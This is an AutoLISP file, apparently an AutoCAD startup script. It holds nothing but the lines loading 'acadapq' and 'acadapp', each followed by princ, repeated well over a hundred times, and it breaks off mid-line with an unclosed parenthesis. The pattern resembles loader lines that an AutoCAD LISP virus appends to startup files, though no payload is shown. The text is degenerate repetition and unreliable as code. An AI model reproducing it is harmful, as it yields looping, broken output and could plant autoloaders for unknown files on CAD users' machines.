(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq")
(princ)
(load "acadapp")
(princ)
(load "acadapq"
